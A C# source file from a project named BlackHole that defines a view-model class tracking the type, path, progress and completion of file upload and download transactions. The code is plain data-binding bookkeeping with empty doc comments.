using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Master.Model
{
    /// <summary>
    /// 
    /// </summary>
    public enum TransactionType : int
    {
        DOWNLOAD = 0,
        UPLOAD = 1
    }

    /// <summary>
    /// 
    /// </summary>
    public abstract class FileTransaction : ViewModel
    {
        /// <summary>
        /// 
        /// </summary>
        public int Type
        {
            get;
        }

        /// <summary>
        /// 
        /// </summary>
        public int Id
        {
            get;
            set;
        }

        /// <summary>
        /// 
        /// </summary>
        public string FilePath
        {
            get;
            set;
        }

        /// <summary>
        /// 
        /// </summary>
        public string Name => Path.GetFileName(FilePath);

        /// <summary>
        /// 
        /// </summary>
        public int Progress
        {
            get { return m_progress; }
            set
            {
                m_progress = value;
                NotifyPropertyChange("Progress");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        public bool Completed
        {
            get;
            protected set;
        }
        
        /// <summary>
        /// 
        /// </summary>
        private int m_progress;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="type"></param>
        public FileTransaction(TransactionType type)
        {
            Type = (int)type;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="current"></param>
        /// <param name="maximum"></param>
        public void UpdateProgression(int current, int maximum) => Progress = ((current + 1) * 100) / Math.Max(maximum, 1);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="downloadedPart"></param>
        public abstract void OnPartDownloaded(DownloadedFilePartMessage downloadedPart);
    }
}
